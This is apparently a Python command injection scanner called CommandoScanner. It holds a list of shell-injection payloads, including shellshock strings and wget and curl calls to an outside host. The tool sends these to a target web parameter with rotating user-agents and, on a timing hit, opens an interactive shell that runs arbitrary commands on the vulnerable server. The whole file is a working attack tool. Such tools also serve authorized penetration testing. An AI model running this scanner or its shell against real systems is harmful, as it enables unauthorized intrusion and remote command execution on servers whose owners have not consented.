# CommandoScanner: A Command Injection Vulnerability Tester
# This tool automates the detection and exploration of command injection vulnerabilities in web applications.
# Written by Jason Bernier
# https://github.com/jasonbernier/CommandoScanner

import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import random
import json

# List of common user-agents for randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
    # Add more user-agents as needed
]

def generate_payloads():
    """
    Generates a list of static and dynamic payloads for command injection testing.
    """
    static_payloads = [
        '; echo vulnerable', '&& echo vulnerable', '| echo vulnerable', '|| echo vulnerable',
        '`echo vulnerable`', '$(echo vulnerable)', '; uname -a', '&& ver', '| ver', '%0a echo vulnerable',
        '"; echo vulnerable', '\'; echo vulnerable', '() { :; }; echo vulnerable',
        '; sleep 10', '&& sleep 10', '| sleep 10', '`sleep 10`', '$(sleep 10)',
        '; timeout /t 10', '&& timeout /t 10', '| timeout /t 10',
        '; ping -c 1 127.0.0.1', '&& ping -c 1 127.0.0.1', '| ping -c 1 127.0.0.1',
        '"; ping -c 1 127.0.0.1', '\'; ping -c 1 127.0.0.1', '() { :; }; ping -c 1 127.0.0.1',
        '; wget http://example.com', '&& nslookup example.com', '| curl http://example.com'
    ]

    # Dynamic payload generation logic can be added here if needed

    return static_payloads

def send_request(url, method, param, payload, headers, proxy):
    """
    Sends a request to the target URL with the given method (GET or POST), injecting the payload into the specified parameter.
    """
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers['User-Agent'] = random.choice(USER_AGENTS)

    try:
        if method.lower() == 'post':
            data = {param: payload}
            response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=30)
        elif method.lower() == 'get':
            params = {param: payload}
            response = requests.get(url, params=params, headers=headers, proxies=proxies, timeout=30)
        else:
            raise ValueError("Unsupported method. Use 'GET' or 'POST'.")

        return payload, response.elapsed.total_seconds(), response.text
    except requests.exceptions.RequestException as e:
        return payload, None, f"Request failed: {e}"

def interactive_shell(url, method, param, headers, proxy):
    """
    Provides an interactive shell for real-time command execution on the vulnerable server, powered by CommandoScanner.
    """
    print("\nCommandoScanner Interactive Shell. Type 'exit' to quit.")
    while True:
        cmd = input("CommandoScanner> ")
        if cmd.lower() == 'exit':
            break

        _, _, response = send_request(url, method, param, cmd, headers, proxy)
        print(response if response else "No response or error encountered.")

def main():
    parser = argparse.ArgumentParser(
        description="""CommandoScanner: Command Injection Vulnerability Tester
        CommandoScanner automates testing for command injection vulnerabilities, incorporating dynamic payload generation, custom headers, and advanced error handling.
        Usage examples:
        - python commandoscanner.py --url "http://example.com" --param "input" --method GET --headers '{"Authorization": "Bearer token"}'
        - python commandoscanner.py --url "http://example.com" --param "input" --method POST --proxy "http://127.0.0.1:8080"
        """,
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('--url', type=str, required=True, help='The target URL where the testing will be performed.')
    parser.add_argument('--param', type=str, required=True, help='The parameter in the request where the command injection payloads will be sent.')
    parser.add_argument('--method', type=str, choices=['GET', 'POST'], default='GET', help='HTTP method to use for sending requests. Default is GET.')
    parser.add_argument('--proxy', type=str, help='Optional HTTP proxy in the format http://127.0.0.1:8080.')
    parser.add_argument('--headers', type=json.loads, help='Optional JSON string of custom headers for the request.')
    args = parser.parse_args()

    payloads = generate_payloads()

    headers = {}
    if args.headers:
        headers.update(args.headers)

    delay = 10  # Set a delay threshold for time-based command injection detection

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(send_request, args.url, args.method, args.param, payload, headers, args.proxy) for payload in payloads]
        
        vulnerability_found = False
        for result in as_completed(futures):
            payload, elapsed_time, response = result.result()
            if elapsed_time and elapsed_time > delay:
                print(f"Vulnerability detected with payload: {payload}")
                vulnerability_found = True
                break
            if "Request failed" in response:
                print(response)
                continue

        if vulnerability_found:
            interactive_shell(args.url, args.method, args.param, headers, args.proxy)
        else:
            print("No vulnerabilities detected with the provided payloads.")

if __name__ == "__main__":
    main()
